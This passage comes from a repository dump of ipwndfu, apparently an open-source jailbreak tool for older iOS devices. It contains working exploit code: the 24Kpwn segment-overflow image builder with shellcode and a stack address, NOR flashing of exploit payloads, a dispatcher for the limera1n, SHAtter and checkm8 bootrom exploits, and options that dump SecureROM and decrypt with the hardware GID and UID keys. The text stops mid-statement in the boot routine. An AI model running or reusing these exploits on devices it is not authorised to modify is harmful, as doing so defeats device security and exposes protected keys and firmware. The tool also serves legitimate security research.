dfu.release_device(device)\n\n        time.sleep(0.5)\n\n        print 'Waiting for iBSS to enter Recovery Mode.'\n        device = recovery.acquire_device()\n        recovery.release_device(device)\n\n    def flash_nor(self, nor):\n        self.boot_ibss()\n        print 'Sending iBSS payload to flash NOR.'\n        MAX_SHELLCODE_LENGTH = 128\n        payload = open('bin/ibss-flash-nor-shellcode.bin', 'rb').read()\n        assert len(payload) <= MAX_SHELLCODE_LENGTH\n        payload += '\\x00' * (MAX_SHELLCODE_LENGTH - len(payload)) + nor\n\n        device = recovery.acquire_device()\n        assert 'CPID:8920' in device.serial_number\n        recovery.send_data(device, payload)\n        try:\n            print 'Sending run command.'\n            recovery.send_command(device, 'run')\n        except usb.core.USBError:\n            # OK\n            pass\n            #print 'Caught USBError; should still work.'\n        recovery.release_device(device)\n        print 'If screen is not red, NOR was flashed successfully and device will reboot.'\n\n    def decrypt_keybag(self, keybag):\n        KEYBAG_LENGTH = 48\n        assert len(keybag) == KEYBAG_LENGTH\n\n        KEYBAG_FILENAME = 'aes-keys/S5L%s-firmware' % self.config.cpid\n        try:\n            f = open(KEYBAG_FILENAME, 'rb')\n            data = f.read()\n            f.close()\n        except IOError:\n            data = str()\n        assert len(data) % 2 * KEYBAG_LENGTH == 0\n\n        for i in range(0, len(data), 2 * KEYBAG_LENGTH):\n            if keybag == data[i:i+KEYBAG_LENGTH]:\n                return data[i+KEYBAG_LENGTH:i+2*KEYBAG_LENGTH]\n\n        device = PwnedDFUDevice()\n        decrypted_keybag = device.aes(keybag, AES_DECRYPT, AES_GID_KEY)\n\n        f = open(KEYBAG_FILENAME, 'a')\n        f.write(keybag + decrypted_keybag)\n        f.close()\n\n        return decrypted_keybag"
        },
        {
          "name": "ibootpatcher",
          "type": "blob",
          "size": 4.4423828125,
          "content": "#!/usr/bin/python\n# ibootpatcher: patch assembly code in iBoot binaries\n# Author: axi0mX\n\nimport argparse, struct, sys\n\ndef arm64_branch_instruction(src, dest):\n  if src > dest:\n    value = 0x18000000 - (src - dest) / 4\n  else:\n    value = 0x14000000 + (dest - src) / 4\n  return struct.pack('<I', value)\n\nMSR_VBAR_EL3_X10      = '\\x0A\\xC0\\x1E\\xD5'\nMSR_VBAR_EL1_X10      = '\\x0A\\xC0\\x18\\xD5'\n\nMRS_X0_SCTLR_EL3      = '\\x00\\x10\\x3E\\xD5'\nMRS_X0_SCTLR_EL1      = '\\x00\\x10\\x38\\xD5'\n\nMSR_SCTLR_EL3_X0      = '\\x00\\x10\\x1E\\xD5'\nMSR_SCTLR_EL1_X0      = '\\x00\\x10\\x18\\xD5'\n\nMSR_SCR_EL3_X0        = '\\x00\\x11\\x1E\\xD5'\n\nMSR_MAIR_EL3_X0       = '\\x00\\xA2\\x1E\\xD5'\nMSR_MAIR_EL1_X0       = '\\x00\\xA2\\x18\\xD5'\n\nMSR_TCR_EL3_X0        = '\\x40\\x20\\x1E\\xD5'\nMSR_TCR_EL1_X0        = '\\x40\\x20\\x18\\xD5'\n\nMSR_TTBR0_EL3_X0      = '\\x00\\x20\\x1E\\xD5'\nMSR_TTBR0_EL1_X0      = '\\x00\\x20\\x18\\xD5'\n\nTLBI_ALLE3            = '\\x1F\\x87\\x0E\\xD5'\nTLBI_ALLE1            = '\\x9F\\x87\\x0C\\xD5'\n\nTLBI_VMALLE1          = '\\x1F\\x87\\x08\\xD5'\n\nMRS_X30_ELR_EL3       = '\\x3E\\x40\\x3E\\xD5'\nMRS_X30_ELR_EL1       = '\\x3E\\x40\\x38\\xD5'\n\nMRS_X1_ESR_EL3        = '\\x01\\x52\\x3E\\xD5'\nMRS_X1_ESR_EL1        = '\\x01\\x52\\x38\\xD5'\n\nMRS_X1_FAR_EL3        = '\\x01\\x60\\x3E\\xD5'\nMRS_X1_FAR_EL1        = '\\x01\\x60\\x38\\xD5'\n\nMRS_X2_ESR_EL3        = '\\x02\\x52\\x3E\\xD5'\nMRS_X2_ESR_EL1        = '\\x02\\x52\\x38\\xD5'\n\nMRS_X2_SPSR_EL3       = '\\x02\\x40\\x3E\\xD5'\nMRS_X2_SPSR_EL1       = '\\x02\\x40\\x38\\xD5'\n\nMSR_ELR_EL3_X0        = '\\x20\\x40\\x1E\\xD5'\nMSR_ELR_EL1_X0        = '\\x20\\x40\\x18\\xD5'\n\nMSR_SPSR_EL3_X1       = '\\x01\\x40\\x1E\\xD5'\nMSR_SPSR_EL1_X1       = '\\x01\\x40\\x18\\xD5'\n\nMRS_X2_SCTLR_EL3      = '\\x02\\x10\\x3E\\xD5'\nMRS_X2_SCTLR_EL1      = '\\x02\\x10\\x38\\xD5'\n\nMSR_SCTLR_EL3_X1      = '\\x01\\x10\\x1E\\xD5'\nMSR_SCTLR_EL1_X1      = '\\x01\\x10\\x18\\xD5'\n\nMSR_ELR_EL2_XZR       = '\\x3F\\x40\\x1C\\xD5'\nMSR_ELR_EL3_XZR       = '\\x3F\\x40\\x1E\\xD5'\n\nMSR_SPSR_EL2_XZR      = '\\x1F\\x40\\x1C\\xD5'\nMSR_SPSR_EL3_XZR      = '\\x1F\\x40\\x1E\\xD5'\n\nMSR_SP_EL1_XZR        = '\\x1F\\x41\\x1C\\xD5'\nMSR_SP_EL2_XZR        = '\\x1F\\x41\\x1E\\xD5'\n\nARM64_NOP             = '\\x1F\\x20\\x03\\xD5'\nORR_X0_X0_0x800000    = '\\x00\\x00\\x69\\xB2'\nORR_X0_X0_0x10000000  = '\\x00\\x00\\x60\\xB2'\nISB                   = '\\xDF\\x3F\\x03\\xD5'\nRET                   = '\\xC0\\x03\\x5F\\xD6'\n\ndef apply_tcr_el3_patch(binary):\n  for i in range(0, len(binary), 4):\n    if binary[i:i+4] == MSR_TCR_EL3_X0:\n      binary = binary[:i] + arm64_branch_instruction(i, 0x1EC) + binary[i+4:]\n      binary = binary[:0x1EC] + ORR_X0_X0_0x10000000 + ORR_X0_X0_0x800000 + MSR_TCR_EL1_X0 + ISB + RET + binary[0x200:]\n\n      print 'TCR_EL3 patch: 0x%x' % i\n      return binary\n\n  print 'ERROR: Could not find MSR TCR_EL3, X0 instruction.'\n  sys.exit(1)\n\ndef apply_generic_el3_patches(binary):\n  el3_patches = [\n    (MSR_VBAR_EL3_X10, MSR_VBAR_EL1_X10),\n    (MRS_X0_SCTLR_EL3, MRS_X0_SCTLR_EL1),\n    (MSR_SCTLR_EL3_X0, MSR_SCTLR_EL1_X0),\n    (MSR_SCR_EL3_X0,   ARM64_NOP),         # there is no EL1 equivalent\n    (MSR_MAIR_EL3_X0,  MSR_MAIR_EL1_X0),\n    (MSR_TTBR0_EL3_X0, MSR_TTBR0_EL1_X0),\n    (MRS_X30_ELR_EL3,  MRS_X30_ELR_EL1),\n    (MRS_X1_ESR_EL3,   MRS_X1_ESR_EL1),\n    (MRS_X1_FAR_EL3,   MRS_X1_FAR_EL1),\n    (MRS_X2_ESR_EL3,   MRS_X2_ESR_EL1),\n    (MRS_X2_SPSR_EL3,  MRS_X2_SPSR_EL1),\n    (MSR_ELR_EL3_X0,   MSR_ELR_EL1_X0),\n    (MSR_SPSR_EL3_X1,  MSR_SPSR_EL1_X1),\n    (MRS_X2_SCTLR_EL3, MRS_X2_SCTLR_EL1),\n    (TLBI_ALLE3,       TLBI_VMALLE1),      # TODO: why not TLBI VMALLE1?\n    (MSR_SCTLR_EL3_X1, MSR_SCTLR_EL1_X1),\n    (MSR_ELR_EL2_XZR,  ARM64_NOP),\n    (MSR_ELR_EL3_XZR,  ARM64_NOP),\n    (MSR_SPSR_EL2_XZR, ARM64_NOP),\n    (MSR_SPSR_EL3_XZR, ARM64_NOP),\n    (MSR_SP_EL1_XZR,   ARM64_NOP),\n    (MSR_SP_EL2_XZR,   ARM64_NOP),\n  ]\n\n  for i in range(0, len(binary), 4):\n    for (before, after) in el3_patches:\n      if binary[i:i+4] == before:\n        binary = binary[:i] + after + binary[i+4:]\n        print 'Generic EL3 patch: 0x%x' % i\n        break\n\n  return binary\n\nif __name__ == '__main__':\n  parser = argparse.ArgumentParser()\n  parser.add_argument('-i', help='input filename', required=True)\n  parser.add_argument('--el1', action='store_true', help=\"make iBoot64 compatible with EL1 (iOS 7.0 - 9.3.5)\")\n  args = parser.parse_args()\n\n  if args.el1:\n    with open(args.i, 'rb') as f:\n      binary = f.read()\n      binary = apply_generic_el3_patches(binary)\n      binary = apply_tcr_el3_patch(binary)\n      filename = args.i + '.patched'\n      with open(filename, 'wb') as out:\n        out.write(binary)\n      print 'Saved:', filename\n  else:\n    print 'No patches requested.'\n"
        },
        {
          "name": "image3.py",
          "type": "blob",
          "size": 3.728515625,
          "content": "import binascii, struct\nimport dfuexec, utilities\n\nclass Image3:\n    def __init__(self, data):\n        (self.magic, self.totalSize, self.dataSize, self.signedSize, self.type) = struct.unpack('4s3I4s', data[0:20])\n        self.tags = []\n        pos = 20\n        while pos < 20 + self.dataSize:\n            (tagMagic, tagTotalSize, tagDataSize) = struct.unpack('4s2I', data[pos:pos+12])\n            self.tags.append((tagMagic, tagTotalSize, tagDataSize, data[pos+12:pos+tagTotalSize]))\n            pos += tagTotalSize\n            if tagTotalSize == 0:\n                break\n\n    @staticmethod\n    def createImage3FromTags(type, tags):\n        dataSize = 0\n        signedSize = 0\n        for (tagMagic, tagTotalSize, tagDataSize, tagData) in tags:\n            dataSize += 12 + len(tagData)\n            if tagMagic[::-1] not in ['CERT', 'SHSH']:\n                signedSize += 12 + len(tagData)\n\n        # totalSize must be rounded up to 64-byte boundary\n        totalSize = 20 + dataSize\n        remainder = totalSize % 64\n        if remainder != 0:\n            totalSize += 64 - remainder\n\n        bytes = struct.pack('4s3I4s', 'Img3'[::-1], totalSize, dataSize, signedSize, type)\n        for (tagMagic, tagTotalSize, tagDataSize, tagData) in tags:\n            bytes += struct.pack('4s2I', tagMagic, tagTotalSize, tagDataSize) + tagData\n        return bytes + '\\x00' * (totalSize - len(bytes))\n\n    def getTags(self, magic):\n        matches = []\n        for tag in self.tags:\n            if tag[0] == magic:\n                matches.append(tag)\n        return matches\n\n    def getKeybag(self):\n        keybags = self.getTags('KBAG'[::-1])\n        for (tagMagic, tagTotalSize, tagDataSize, tagData) in keybags:\n            (kbag_type, aes_type) = struct.unpack('<2I', tagData[:8])\n            if kbag_type == 1:\n                return tagData[8:8+48]\n        return None\n\n    def getPayload(self):\n        data = self.getTags('DATA'[::-1])\n        if len(data) == 1:\n            return data[0][3]\n\n    def getDecryptedPayload(self):\n        keybag = self.getKeybag()\n        device = dfuexec.PwnedDFUDevice()\n        decrypted_keybag = device.decrypt_keybag(keybag)\n        return utilities.aes_decrypt(self.getPayload(), binascii.hexlify(decrypted_keybag[:16]), binascii.hexlify(decrypted_keybag[16:]))\n\n    def shrink24KpwnCertificate(self):\n        for i in range(len(self.tags)):\n            tag = self.tags[i]\n            if tag[0] == 'CERT'[::-1] and len(tag[3]) >= 3072:\n                data = tag[3][:3072]\n                assert data[-1] == '\\x00'\n                data = data.rstrip('\\x00')\n                self.tags[i] = ('CERT'[::-1], 12 + len(data), len(data), data)\n                break\n\n    def newImage3(self, decrypted=True):\n        typeTag = self.getTags('TYPE'[::-1])\n        assert len(typeTag) == 1\n        versTag = self.getTags('VERS'[::-1])\n        assert len(versTag) <= 1\n        dataTag = self.getTags('DATA'[::-1])\n        assert len(dataTag) == 1\n        sepoTag = self.getTags('SEPO'[::-1])\n        assert len(sepoTag) <= 2\n        bordTag = self.getTags('BORD'[::-1])\n        assert len(bordTag) <= 2\n        kbagTag = self.getTags('KBAG'[::-1])\n        assert len(kbagTag) <= 2\n        shshTag = self.getTags('SHSH'[::-1])\n        assert len(shshTag) <= 1\n        certTag = self.getTags('CERT'[::-1])\n        assert len(certTag) <= 1\n\n        (tagMagic, tagTotalSize, tagDataSize, tagData) = dataTag[0]\n        if len(kbagTag) > 0 and decrypted:\n          newTagData = self.getDecryptedPayload()\n          kbagTag = []\n        else:\n          newTagData =  tagData\n        assert len(tagData) == len(newTagData)\n\n        return Image3.createImage3FromTags(self.type, typeTag + [(tagMagic, tagTotalSize, tagDataSize, newTagData)] + versTag + sepoTag + bordTag + kbagTag + shshTag + certTag)\n"
        },
        {
          "name": "image3_24Kpwn.py",
          "type": "blob",
          "size": 2.60546875,
          "content": "# Credit: This file is based on 24Kpwn exploit (segment overflow) by chronic, CPICH, ius, MuscleNerd, Planetbeing, pod2g, posixninja, et al.\n\nimport struct\nimport image3\n\ndef exploit(img3, securerom):\n    with open('bin/24Kpwn-shellcode.bin', 'rb') as f:\n        shellcode = f.read()\n    MAX_SHELLCODE_LENGTH = 1024\n    assert len(shellcode) <= MAX_SHELLCODE_LENGTH\n\n    # Check IMG3 constraints.\n    (img3_magic, total_size, data_size, signed_size, magic) = struct.unpack('<4s3I4s', img3[:20])\n    assert img3_magic == 'Img3'[::-1] and signed_size != 0 and magic == 'illb'[::-1]\n    assert  total_size < 0x24000 - (4 + 12 + 64 + 12 + 12) - len(shellcode) - 12\n    assert   data_size < 0x24000 - (4 + 12 + 64 + 12 + 12) - len(shellcode) - 12 - 20\n    assert signed_size < 0x24000 - (4 + 12 + 64 + 12 + 12) - len(shellcode) - 12 - 20\n    assert 20 + signed_size + 4 <= len(img3) and img3[20 + signed_size:20 + signed_size + 4] == 'SHSH'[::-1]\n\n    PADDING = 0x24000 - (4 + 12 + 64 + 12 + 12) - len(shellcode) - (20 + signed_size + 12)\n    SHELLCODE_ADDRESS = 0x84000000 + 1 + (20 + signed_size + 12 + PADDING)\n    STACK_ADDRESS = 0x84033EA4\n    img3 = struct.pack('<4s3I4s', 'Img3'[::-1], 0x24200, 0x241BC, 0x23F88, 'illb'[::-1]) + img3[20:20 + signed_size] \\\n         + struct.pack('4s2I%sx' % PADDING, '24KP'[::-1], 12 + PADDING + len(shellcode) + 4, PADDING + len(shellcode) + 4) + shellcode \\\n         + struct.pack('<I4s2I64x4s2I', SHELLCODE_ADDRESS, 'SHSH'[::-1], 12 + 64, 64, 'CERT'[::-1], 12, 0) \\\n         + struct.pack('<4s2I460sI48x', '24KP'[::-1], 12 + 512, 512, securerom[0xB000:0xB000 + 460], STACK_ADDRESS)\n    assert len(img3) == 0x24200\n    return img3\n\ndef remove_exploit(img3):\n    assert len(img3) > 0x24000\n    assert img3[16:20] == 'illb'[::-1]\n\n    obj = image3.Image3(img3)\n    if obj.getDecryptedPayload()[:4] != '\\x0e\\x00\\x00\\xea':\n        # This is a 24Kpwn implementation which changes DATA tag. First dword of DATA tag should look like a shellcode address.\n        shellcode_address, = struct.unpack('<I', img3[64:68])\n        assert img3[52:56] == 'DATA'[::-1]\n        assert 0x84000000 <= shellcode_address and shellcode_address <= 0x84024000\n\n        # Try to find the correct value for the first dword.\n        found = False\n        for pos in xrange(shellcode_address - 0x84000000, len(img3)):\n            obj = image3.Image3(img3[:64] + img3[pos:pos + 4] + img3[68:])\n            if obj.getDecryptedPayload()[:4] == '\\x0e\\x00\\x00\\xea':\n                found = True\n                break\n        assert found\n\n    obj.shrink24KpwnCertificate()\n\n    img3 = obj.newImage3(decrypted=False)\n    assert len(img3) <= 0x24000\n    return img3\n"
        },
        {
          "name": "ipwndfu",
          "type": "blob",
          "size": 18.40625,
          "content": "#!/usr/bin/python\n# ipwndfu: open-source jailbreaking tool for older iOS devices\n# Author: axi0mX\n\nimport binascii, datetime, getopt, hashlib, struct, sys, time\nimport dfu, nor, utilities\nimport alloc8, checkm8, image3_24Kpwn, limera1n, SHAtter, steaks4uce, usbexec\nfrom dfuexec import *\n\ndef print_help():\n    print 'USAGE: ipwndfu [options]'\n    print 'Interact with an iOS device in DFU Mode.\\n'\n    print 'Basic options:'\n    print '  -p\\t\\t\\t\\tUSB exploit for pwned DFU Mode'\n    print '  -x\\t\\t\\t\\tinstall alloc8 exploit to NOR'\n    print '  -f file\\t\\t\\tsend file to device in DFU Mode'\n    print 'Advanced options:'\n    print '  --demote\\t\\t\\tdemote device to enable JTAG'\n    print '  --boot\\t\\t\\tboot device'\n    print '  --dump=address,length\\t\\tdump memory to stdout'\n    print '  --hexdump=address,length\\thexdump memory to stdout'\n    print '  --dump-rom\\t\\t\\tdump SecureROM'\n    print '  --dump-nor=file\\t\\tdump NOR to file'\n    print '  --flash-nor=file\\t\\tflash NOR (header and firmware only) from file'\n    print '  --24kpwn\\t\\t\\tinstall 24Kpwn exploit to NOR'\n    print '  --remove-24kpwn\\t\\tremove 24Kpwn exploit from NOR'\n    print '  --remove-alloc8\\t\\tremove alloc8 exploit from NOR'\n    print '  --decrypt-gid=hexdata\\t\\tAES decrypt with GID key'\n    print '  --encrypt-gid=hexdata\\t\\tAES encrypt with GID key'\n    print '  --decrypt-uid=hexdata\\t\\tAES decrypt with UID key'\n    print '  --encrypt-uid=hexdata\\t\\tAES encrypt with UID key'\n\nif __name__ == '__main__':\n    try:\n        advanced = ['demote', 'boot', 'dump=', 'hexdump=', 'dump-rom', 'dump-nor=', 'flash-nor=', '24kpwn', 'remove-24kpwn', 'remove-alloc8', 'decrypt-gid=', 'encrypt-gid=', 'decrypt-uid=', 'encrypt-uid=']\n        opts, args = getopt.getopt(sys.argv[1:], 'pxf:', advanced)\n    except getopt.GetoptError:\n        print 'ERROR: Invalid arguments provided.'\n        print_help()\n        sys.exit(2)\n\n    if len(opts) == 0:\n        print_help()\n        sys.exit(2)\n\n    for opt, arg in opts:\n        if opt == '-p':\n            device = dfu.acquire_device()\n            serial_number = device.serial_number\n            dfu.release_device(device)\n\n            if 'CPID:8720' in serial_number:\n                steaks4uce.exploit()\n            elif 'CPID:8920' in serial_number:\n                limera1n.exploit()\n            elif 'CPID:8922' in serial_number:\n                limera1n.exploit()\n            elif 'CPID:8930' in serial_number:\n                SHAtter.exploit()\n            elif 'CPID:8947' in serial_number:\n                checkm8.exploit()\n            elif 'CPID:8950' in serial_number:\n                checkm8.exploit()\n            elif 'CPID:8955' in serial_number:\n                checkm8.exploit()\n            elif 'CPID:8960' in serial_number:\n                checkm8.exploit()\n            elif 'CPID:8002' in serial_number:\n                checkm8.exploit()\n            elif 'CPID:8004' in serial_number:\n                checkm8.exploit()\n            elif 'CPID:8010' in serial_number:\n                checkm8.exploit()\n            elif 'CPID:8011' in serial_number:\n                checkm8.exploit()\n            elif 'CPID:8015' in serial_number:\n                checkm8.exploit()\n            else:\n                print 'Found:', serial_number\n                print 'ERROR: This device is not supported.'\n                sys.exit(1)\n\n        if opt == '-x':\n            device = PwnedDFUDevice()\n            if device.config.cpid != '8920':\n                print 'This is not a compatible device. alloc8 exploit is for iPhone 3GS only.'\n                sys.exit(1)\n\n            if device.config.version == '359.3':\n                print 'WARNING: iPhone 3GS (old bootrom) was detected. Use 24Kpwn exploit for faster boots, alloc8 exploit is for testing purposes only.'\n                raw_input(\"Press ENTER to continue.\")\n\n            print 'Installing alloc8 exploit to NOR.'\n\n            dump = device.nor_dump(saveBackup=True)\n\n            nor = nor.NorData(dump)\n\n            for byte in nor.parts[1]:\n                if byte != '\\x00':\n                    print 'ERROR: Bytes following IMG2 header in NOR are not zero. alloc8 exploit was likely previously installed. Exiting.'\n                    sys.exit(1)\n            if len(nor.images) == 0 or len(nor.images[0]) < 0x24000:\n                print 'ERROR: 24Kpwn LLB was not found. You must restore a custom 24Kpwn IPSW before using this exploit.'\n                sys.exit(1)\n\n            print 'Preparing modified NOR with alloc8 exploit.'\n            # Remove 24Kpwn first.\n            nor.images[0] = image3_24Kpwn.remove_exploit(nor.images[0])\n            new_nor = alloc8.exploit(nor, device.config.version)\n            device.flash_nor(new_nor.dump())\n\n        if opt == '-f':\n            try:\n                with open(arg, 'rb') as f:\n                    data = f.read()\n            except IOError:\n                print 'ERROR: Could not read file:', arg\n                sys.exit(1)\n\n            device = dfu.acquire_device()\n            dfu.reset_counters(device)\n            dfu.send_data(device, data)\n            dfu.request_image_validation(device)\n            dfu.release_device(device)\n\n        if opt == '--demote':\n            device = dfu.acquire_device()\n            serial_number = device.serial_number\n            dfu.release_device(device)\n\n            if 'PWND:[checkm8]' in serial_number:\n                pwned = usbexec.PwnedUSBDevice()\n                old_value = pwned.read_memory_uint32(pwned.platform.demotion_reg)\n                print 'Demotion register: 0x%x' % old_value\n                if old_value & 1:\n                    print 'Attempting to demote device.'\n                    pwned.write_memory_uint32(pwned.platform.demotion_reg, old_value & 0xFFFFFFFE)\n                    new_value = pwned.read_memory_uint32(pwned.platform.demotion_reg)\n                    print 'Demotion register: 0x%x' % new_value\n                    if old_value != new_value:\n                        print 'Success!'\n                    else:\n                        print 'Failed.'\n                else:\n                    print 'WARNING: Device is already demoted.'\n            else:\n                print 'ERROR: Demotion is only supported on devices pwned with checkm8 exploit.'\n                sys.exit(1)\n\n        if opt == '--dump':\n            if arg.count(',') != 1:\n                print 'ERROR: You must provide exactly 2 comma separated values: address,length'\n                sys.exit(1)\n            raw_address, raw_length = arg.split(',')\n            address = int(raw_address, 16) if raw_address.startswith('0x') else int(raw_address, 10)\n            length = int(raw_length, 16) if raw_length.startswith('0x') else int(raw_length, 10)\n\n            device = dfu.acquire_device()\n            serial_number = device.serial_number\n            dfu.release_device(device)\n\n            if 'PWND:[checkm8]' in serial_number:\n                device = usbexec.PwnedUSBDevice()\n                sys.stdout.write(device.read_memory(address, length))\n            else:\n                device = PwnedDFUDevice()\n                print device.read_memory(address, length)\n\n        if opt == '--hexdump':\n            if arg.count(',') != 1:\n                print 'ERROR: You must provide exactly 2 comma separated values: address,length'\n                sys.exit(1)\n            raw_address, raw_length = arg.split(',')\n            address = int(raw_address, 16) if raw_address.startswith('0x') else int(raw_address, 10)\n            length = int(raw_length, 16) if raw_length.startswith('0x') else int(raw_length, 10)\n\n            device = dfu.acquire_device()\n            serial_number = device.serial_number\n            dfu.release_device(device)\n\n            if 'PWND:[checkm8]' in serial_number:\n                device = usbexec.PwnedUSBDevice()\n                dump = device.read_memory(address, length)\n                for line in utilities.hex_dump(dump, address).splitlines():\n                    print '%x: %s' % (address, line[10:])\n                    address += 16\n            else:\n                device = PwnedDFUDevice()\n                dump = device.read_memory(address, length)\n                print utilities.hex_dump(dump, address),\n\n        if opt == '--dump-rom':\n            device = dfu.acquire_device()\n            serial_number = device.serial_number\n            dfu.release_device(device)\n\n            if 'PWND:[checkm8]' in serial_number:\n                pwned = usbexec.PwnedUSBDevice()\n                securerom = pwned.read_memory(pwned.platform.rom_base, pwned.platform.rom_size)\n                if hashlib.sha1(securerom).hexdigest() != pwned.platform.rom_sha1:\n                    print hashlib.sha1(securerom).hexdigest()\n                    print 'ERROR: SecureROM was dumped, but the SHA1 hash does not match. Exiting.'\n                    sys.exit(1)\n                chip    = securerom[0x200:0x240].split(' ')[2][:-1]\n                kind    = securerom[0x240:0x280].split('\\0')[0]\n                version = securerom[0x280:0x2C0].split('\\0')[0][6:]\n                filename = 'SecureROM-%s-%s-%s.dump' % (chip, version, kind)\n                with open(filename, 'wb') as f:\n                    f.write(securerom)\n                print 'Saved:', filename\n            else:\n                device = PwnedDFUDevice()\n                securerom = device.securerom_dump()\n                filename = 'SecureROM-%s-RELEASE.dump' % device.config.version\n                f = open(filename, 'wb')\n                f.write(securerom)\n                f.close()\n                print 'SecureROM dumped to file:', filename\n\n        if opt == '--dump-nor':\n            device = PwnedDFUDevice()\n            if device.config.cpid != '8920':\n                print 'This is not a compatible device. Dumping NOR is only supported on iPhone 3GS.'\n                sys.exit(1)\n            nor = device.nor_dump(saveBackup=False)\n            f = open(arg, 'wb')\n            f.write(nor)\n            f.close()\n            print 'NOR dumped to file: %s' % arg\n\n        if opt == '--flash-nor':\n            print 'Flashing NOR from file:', arg\n            f = open(arg, 'rb')\n            new_nor = f.read()\n            f.close()\n            if new_nor[:4] != 'IMG2'[::-1]:\n                print 'ERROR: Bad IMG2 header magic. This is not a valid NOR. Exiting.'\n                sys.exit(1)\n\n            device = PwnedDFUDevice()\n            if device.config.cpid != '8920':\n                print 'This is not a compatible device. Flashing NOR is only supported on iPhone 3GS.'\n                sys.exit(1)\n            device.nor_dump(saveBackup=True)\n            device.flash_nor(new_nor)\n\n        if opt == '--24kpwn':\n            print '*** based on 24Kpwn exploit (segment overflow) by chronic, CPICH, ius, MuscleNerd, Planetbeing, pod2g, posixninja, et al. ***'\n\n            device = PwnedDFUDevice()\n            if device.config.version != '359.3':\n                print 'Only iPhone 3GS (old bootrom) is supported.'\n                sys.exit(1)\n\n            dump = device.nor_dump(saveBackup=True)\n\n            print 'Preparing modified NOR with 24Kpwn exploit.'\n            nor = nor.NorData(dump)\n            for byte in nor.parts[1]:\n                if byte != '\\x00':\n                    print 'ERROR: Bytes following IMG2 header in NOR are not zero. alloc8 exploit was likely previously installed. Exiting.'\n                    sys.exit(1)\n            if len(nor.images) == 0:\n                print 'ERROR: 24Kpwn exploit cannot be installed, because NOR has no valid LLB. Exiting.'\n                sys.exit(1)\n\n            # Remove existing 24Kpwn exploit.\n            if len(nor.images[0]) > 0x24000:\n                nor.images[0] = image3_24Kpwn.remove_exploit(nor.images[0])\n            nor.images[0] = image3_24Kpwn.exploit(nor.images[0], device.securerom_dump())\n            device.flash_nor(nor.dump())\n\n        if opt == '--remove-24kpwn':\n            device = PwnedDFUDevice()\n            if device.config.cpid != '8920':\n                print 'This is not a compatible device. 24Kpwn exploit is only supported on iPhone 3GS.'\n                sys.exit(1)\n\n            print 'WARNING: This feature is for researchers only. Device will probably not boot into iOS until it is restored in iTunes.'\n            raw_input(\"Press ENTER to continue.\")\n\n            dump = device.nor_dump(saveBackup=True)\n\n            nor = nor.NorData(dump)\n\n            if len(nor.images) == 0:\n                print 'ERROR: NOR has no valid LLB. It seems that 24Kpwn exploit is not installed. Exiting.'\n                sys.exit(1)\n            if len(nor.images[0]) <= 0x24000:\n                print 'ERROR: LLB is not oversized. It seems that 24Kpwn exploit is not installed. Exiting.'\n                sys.exit(1)\n\n            print 'Preparing modified NOR without 24Kpwn exploit.'\n            nor.images[0] = image3_24Kpwn.remove_exploit(nor.images[0])\n            device.flash_nor(nor.dump())\n\n        if opt == '--remove-alloc8':\n            device = PwnedDFUDevice()\n            if device.config.cpid != '8920':\n                print 'This is not a compatible device. alloc8 exploit is for iPhone 3GS only.'\n                sys.exit(1)\n\n            print 'WARNING: This feature is for researchers only. Device will probably not boot into iOS until it is restored in iTunes.'\n            raw_input(\"Press ENTER to continue.\")\n\n            dump = device.nor_dump(saveBackup=True)\n\n            nor = nor.NorData(dump)\n\n            if len(nor.images) < 700:\n                print 'ERROR: It seems that alloc8 exploit is not installed. There are less than 700 images in NOR. Exiting.'\n                sys.exit(1)\n\n            print 'Preparing modified NOR without alloc8 exploit.'\n            new_nor = alloc8.remove_exploit(nor)\n            device.flash_nor(new_nor.dump())\n\n        if opt == '--decrypt-gid':\n            device = dfu.acquire_device()\n            serial_number = device.serial_number\n            dfu.release_device(device)\n\n            if 'PWND:[checkm8]' in serial_number:\n                pwned = usbexec.PwnedUSBDevice()\n                print 'Decrypting with %s GID key.' % pwned.platform.name()\n                print pwned.aes(arg.decode('hex'), usbexec.AES_DECRYPT, usbexec.AES_GID_KEY).encode('hex')\n            else:\n                device = PwnedDFUDevice()\n                print 'Decrypting with S5L%s GID key.' % device.config.cpid\n                print device.aes_hex(arg, AES_DECRYPT, AES_GID_KEY)\n\n        if opt == '--encrypt-gid':\n            device = dfu.acquire_device()\n            serial_number = device.serial_number\n            dfu.release_device(device)\n\n            if 'PWND:[checkm8]' in serial_number:\n                pwned = usbexec.PwnedUSBDevice()\n                print 'Encrypting with %s GID key.' % pwned.platform.name()\n                print pwned.aes(arg.decode('hex'), usbexec.AES_ENCRYPT, usbexec.AES_GID_KEY).encode('hex')\n            else:\n                device = PwnedDFUDevice()\n                print 'Encrypting with S5L%s GID key.' % device.config.cpid\n                print device.aes_hex(arg, AES_ENCRYPT, AES_GID_KEY)\n\n        if opt == '--decrypt-uid':\n            device = dfu.acquire_device()\n            serial_number = device.serial_number\n            dfu.release_device(device)\n\n            if 'PWND:[checkm8]' in serial_number:\n                pwned = usbexec.PwnedUSBDevice()\n                print 'Decrypting with %s device-specific UID key.' % pwned.platform.name()\n                print pwned.aes(arg.decode('hex'), usbexec.AES_DECRYPT, usbexec.AES_UID_KEY).encode('hex')\n            else:\n                device = PwnedDFUDevice()\n                print 'Decrypting with device-specific UID key.'\n                print device.aes_hex(arg, AES_DECRYPT, AES_UID_KEY)\n\n        if opt == '--encrypt-uid':\n            device = dfu.acquire_device()\n            serial_number = device.serial_number\n            dfu.release_device(device)\n\n            if 'PWND:[checkm8]' in serial_number:\n                pwned = usbexec.PwnedUSBDevice()\n                print 'Encrypting with %s device-specific UID key.' % pwned.platform.name()\n                print pwned.aes(arg.decode('hex'), usbexec.AES_ENCRYPT, usbexec.AES_UID_KEY).encode('hex')\n            else:\n                device = PwnedDFUDevice()\n                print 'Encrypting with device-specific UID key.'\n                print device.aes_hex(arg, AES_ENCRYPT, AES_UID_KEY)\n\n        if opt == '--boot':\n            device = dfu.acquire_device()\n            serial_number = device.serial_number\n            dfu.release_device(device)\n\n            if 'CPID:8015' not in serial_number or 'PWND:[checkm8]' not in serial_number:\n                print serial_number\n                print 'ERROR: Option --boot is currently only supported on iPhone X pwned with checkm8.'\n            else:\n                HEAP_BASE         = 0x1801E8000\n                HEAP_WRITE_OFFSET = 0x5000\n                HEAP_WRITE_HASH   = 0x10000D4EC\n                HEAP_CHECK_ALL    = 0x10000DB98\n                HEAP_STATE        = 0x1800086A0\n                NAND_BOOT_JUMP    = 0x10000188C\n                BOOTSTRAP_TASK_LR = 0x180015F88\n                DFU_BOOL          = 0x1800085B0\n                DFU_NOTIFY        = 0x1000098B4\n                DFU_STATE         = 0x1800085E0\n                TRAMPOLINE        = 0x180018000\n                block1 = struct.pack('<8Q', 0, 0, 0, 